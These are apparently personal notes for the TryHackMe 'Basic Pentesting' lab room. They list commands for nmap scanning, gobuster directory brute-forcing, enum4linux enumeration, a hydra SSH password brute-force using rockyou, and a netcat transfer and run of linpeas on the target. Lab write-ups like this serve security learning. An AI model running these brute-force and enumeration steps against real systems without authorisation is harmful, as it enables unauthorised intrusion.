# Overview
https://tryhackme.com/room/basicpentestingjt

```
export IP=10.10.191.59
```

## NMAP
```
mkdir nmap
nmap -sC -sV -oN nmap/initial $IP
```

## Gobuster
```
export WORDLIST=/opt/directory-list-2.3-medium.txt
gobuster dir -u "http://$IP" -w $WORDLIST | tee gobuster.log
```

## enum4linux
```
/opt/enum4linx/enum4linx.pl -a $IP | tee enum4linux.log
```

## hyra
For finding passwords
```
hydra -l jan -P /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt ssh://$IP
```

# linpeas!
target terminal:
```
nc -l -p 1234 > /tmp/jake &
```

my terminal:
```
nc $IP $PORT < linpeas.sh
```

Finally, run:
```
chmod +x /tmp/jake
/tmp/jake
```
